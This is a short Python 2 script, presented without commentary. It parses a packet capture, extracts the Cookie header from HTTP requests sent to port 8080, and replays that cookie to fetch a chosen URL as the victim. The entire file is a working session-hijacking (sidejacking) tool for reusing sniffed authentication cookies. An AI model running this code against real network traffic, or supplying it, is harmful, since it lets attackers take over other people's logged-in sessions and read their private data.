#!/usr/bin/python
import sys
import urllib2
import re
import requests
import cookielib
import dpkt

def main():
	# Optional - grab from pcap file. Automate to parse via multiple pcap files
	# Given cookie to url - pairing/matching
	for arg in sys.argv[1:3]:
		if ".pcap" in sys.argv[1]:
			pcap = sys.argv[1]
		if "http://" in sys.argv[2]:
			req_url = sys.argv[2]
	print build_html(parse_pcap(pcap), req_url)

def parse_pcap(pcap):
	# Adadpted from http://stackoverflow.com/questions/30932918/python-dpkt-with-pcap-how-can-i-print-the-packet-data
	f = open(pcap)
	pcap_reader = dpkt.pcap.Reader(f)

	for ts, buf in pcap_reader:
		eth = dpkt.ethernet.Ethernet(buf)
		ip = eth.data
		tcp = ip.data
		if tcp.dport == 8080:
			http = dpkt.http.Request(tcp.data)
			print http.headers
			if http.headers.has_key('cookie'):
				cookie = http.headers.get('cookie')
				return cookie

def build_html(cookie, url):
	opener = urllib2.build_opener()
	if cookie:
		opener.addheaders.append(('Cookie', cookie))
	response = opener.open(url)
	html = response.read()
	return html

if __name__ == "__main__":
	main()